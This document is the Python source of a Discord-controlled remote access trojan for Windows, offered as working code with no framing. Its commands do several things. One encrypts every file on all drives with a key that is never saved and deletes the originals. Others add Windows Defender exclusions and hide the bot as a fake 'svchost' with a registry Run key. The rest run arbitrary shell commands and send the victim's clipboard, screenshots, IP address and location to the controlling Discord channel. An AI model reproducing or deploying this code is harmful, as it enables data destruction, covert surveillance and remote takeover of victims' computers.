import os
import certifi
os.environ['SSL_CERT_FILE'] = certifi.where()
import sys
import ctypes
import discord
from discord.ext import commands
import subprocess
import tempfile
import io
import random
import string
import shutil
import webbrowser
import platform
import winreg
import psutil
import pyperclip
import pyautogui
import mss
from PIL import ImageGrab, Image
import requests
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets
import asyncio

TOKEN = "BOT_TOKEN"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

encrypted_count = 0
count_lock = threading.Lock()
self_path = os.path.abspath(sys.argv[0])
key = secrets.token_bytes(32)
crypt_lock = asyncio.Lock()
total_files = 0

def encrypt_file(file_path, new_ext):
    global encrypted_count

    if os.path.abspath(file_path) == self_path:
        return False

    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        if not data:
            return False

        iv = secrets.token_bytes(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len] * pad_len)

        ct = encryptor.update(data) + encryptor.finalize()
        encrypted_data = iv + ct

        new_file = file_path + '.' + new_ext
        with open(new_file, 'wb') as f:
            f.write(encrypted_data)

        os.remove(file_path)

        with count_lock:
            encrypted_count += 1

        return True

    except Exception:
        return False

def scan_count_files(directory):
    count = 0
    try:
        for entry in os.scandir(directory):
            if entry.name in ('.', '..'):
                continue
            full_path = entry.path
            if entry.is_dir(follow_symlinks=False):
                count += scan_count_files(full_path)
            elif entry.is_file(follow_symlinks=False):
                count += 1
    except (PermissionError, FileNotFoundError):
        pass
    except Exception:
        pass
    return count

def scan_and_encrypt(directory, new_ext, progress_callback=None):
    try:
        for entry in os.scandir(directory):
            if entry.name in ('.', '..'):
                continue
            full_path = entry.path
            if entry.is_dir(follow_symlinks=False):
                scan_and_encrypt(full_path, new_ext, progress_callback)
            elif entry.is_file(follow_symlinks=False):
                if encrypt_file(full_path, new_ext) and progress_callback:
                    progress_callback()
    except (PermissionError, FileNotFoundError):
        pass
    except Exception:
        pass

def get_logical_drives():
    drives = []
    bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    for i in range(26):
        if bitmask & (1 << i):
            drives.append(chr(65 + i) + ':\\')
    return drives

@bot.command(help="Encrypts all files, new extension must be specified (e.g. !crypt locked)")
async def crypt(ctx, new_ext: str):
    global encrypted_count, total_files

    if crypt_lock.locked():
        await ctx.send("An encryption process is already running. Please wait until it finishes.")
        return

    async with crypt_lock:
        new_ext = new_ext.strip().lstrip('.')
        if not new_ext.isalnum():
            await ctx.send("Extension must contain only letters and numbers.")
            return

        encrypted_count = 0
        total_files = 0

        await ctx.send("🔍 Scanning files, please wait...")

        drives = get_logical_drives()
        user_profile = os.environ.get('USERPROFILE')

        def count_all_files():
            global total_files
            for d in drives:
                total_files += scan_count_files(d)
            if user_profile:
                total_files += scan_count_files(user_profile)

        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, count_all_files)

        if total_files == 0:
            await ctx.send("No files found.")
            return

        await ctx.send(f"🔐 Encryption started ({total_files} files found)...")

        def progress_callback():
            global encrypted_count
            with count_lock:
                encrypted_count += 1

        tasks = []
        for drive in drives:
            tasks.append(asyncio.to_thread(scan_and_encrypt, drive, new_ext, progress_callback))
        if user_profile:
            tasks.append(asyncio.to_thread(scan_and_encrypt, user_profile, new_ext, progress_callback))

        await asyncio.gather(*tasks)

        await ctx.send(f"✅ Encryption completed.\nTotal files: {total_files}\nEncrypted files: {encrypted_count}")

def hide_file_path(file_path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
    except:
        pass

@bot.command(help="Uploads a file and tries to add Defender exclusion")
async def upload(ctx):
    try:
        if not ctx.message.attachments:
            return await ctx.send("❌ No file attached.")

        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        new_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + os.path.splitext(filename)[1]
        path = os.path.join(tempfile.gettempdir(), new_name)

        await attachment.save(path)
        hide_file_path(path)

        try:
            subprocess.run(f"powershell Add-MpPreference -ExclusionPath '{path}'", shell=True, timeout=5)
            defender = "Yes"
        except:
            defender = "No"

        await ctx.send(f"✅ File uploaded\n📂 Path: `{path}`\n🛡️ Defender Exclusion: {defender}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Adds the bot to Windows startup hidden")
async def startup(ctx):
    try:
        current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]

        if getattr(sys, 'frozen', False):
            file_ext = '.exe'
        else:
            file_ext = '.py'

        target_folder = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'svchost')
        os.makedirs(target_folder, exist_ok=True)

        target_filename = f"svchost{file_ext}"
        target_path = os.path.join(target_folder, target_filename)

        if not os.path.exists(target_path):
            shutil.copy2(current_path, target_path)
            ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)

        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        random_key = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_READ) as key:
            existing_keys = [winreg.EnumValue(key, i)[0] for i in range(winreg.QueryInfoKey(key)[1])]

        if random_key not in existing_keys:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, random_key, 0, winreg.REG_SZ, target_path)
            message = f"✓ Added to startup hidden: {random_key}"
        else:
            message = "⚠ Already registered in startup"

        await ctx.send(message)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(help="Sends clipboard content (text or image)")
async def clipboard(ctx):
    try:
        content = pyperclip.paste()
        if content.strip():
            if len(content) > 1500:
                with io.StringIO(content) as f:
                    await ctx.send(file=discord.File(f, filename="clipboard.txt"))
            else:
                await ctx.send(f"```{content}```")
            return

        img = ImageGrab.grabclipboard()
        if isinstance(img, Image.Image):
            with io.BytesIO() as b:
                img.save(b, format='PNG')
                b.seek(0)
                await ctx.send(file=discord.File(b, filename="clipboard.png"))
            return

        await ctx.send("Clipboard is empty or unsupported content.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Lists running processes")
async def tasklist(ctx):
    try:
        processes = [f"{p.info['pid']}\t{p.info['name'][:12]}\t{p.info['cpu_percent']:.1f}\t{p.info['memory_percent']:.1f}" for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
        message_parts = ["```PID\tName\tCPU\tMemory"] + processes[:30] + ["```"]
        await ctx.send("\n".join(message_parts))
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Terminates process by name (e.g. !taskkill chrome.exe)")
async def taskkill(ctx, name: str):
    try:
        for p in psutil.process_iter(['pid', 'name']):
            if p.info['name'].lower() == name.lower():
                psutil.Process(p.info['pid']).terminate()
                await ctx.send(f"✓ {name} terminated")
                return
        await ctx.send("Not found")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Runs a command in the shell")
async def cmd(ctx, *, command: str):
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        output_decoded = output.decode(errors='replace') or ""
        error_decoded = error.decode(errors='replace') or ""
        full_text = f"Output:\n{output_decoded}\nError:\n{error_decoded}" if error_decoded else f"Output:\n{output_decoded}"
        await ctx.send(f"```{full_text[:1900]}```")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Sends system information")
async def pcinfo(ctx):
    try:
        ip_info = requests.get("http://ip-api.com/json/").json()
        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        disk_gb = psutil.disk_usage('/').total / (1024 ** 3)
        os_info = f"{platform.system()} {platform.release()}"
        await ctx.send(f"📡 IP: {ip_info.get('query')}\n📍 Location: {ip_info.get('city')}, {ip_info.get('country')}\n💻 OS: {os_info}\n💾 Disk: {disk_gb:.2f} GB\n🧠 RAM: {ram_gb:.2f} GB")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Takes a screenshot and sends it")
async def screen(ctx):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
        with mss.mss() as sct:
            sct.shot(output=f.name)
        try:
            await ctx.send(file=discord.File(f.name))
        finally:
            os.remove(f.name)

@bot.command(help="Opens the specified URL in the default browser")
async def website(ctx, *, url: str):
    try:
        if not url.startswith("http"):
            url = "https://" + url
        webbrowser.open(url)
        await ctx.send(f"Website opened: {url}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Shows a message box on the screen")
async def message(ctx, *, message_text: str):
    try:
        pyautogui.alert(message_text)
        await ctx.send("Message displayed")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(help="Shows the list of commands")
async def help(ctx):
    help_text = "**Command List:**\n"
    for cmd in bot.commands:
        desc = cmd.help if cmd.help else "No description"
        help_text += f"• `!{cmd.name}` — {desc}\n"

    if len(help_text) > 2000:
        chunks = [help_text[i:i+1900] for i in range(0, len(help_text), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
    else:
        await ctx.send(help_text)

if __name__ == "__main__":
    bot.run(TOKEN)
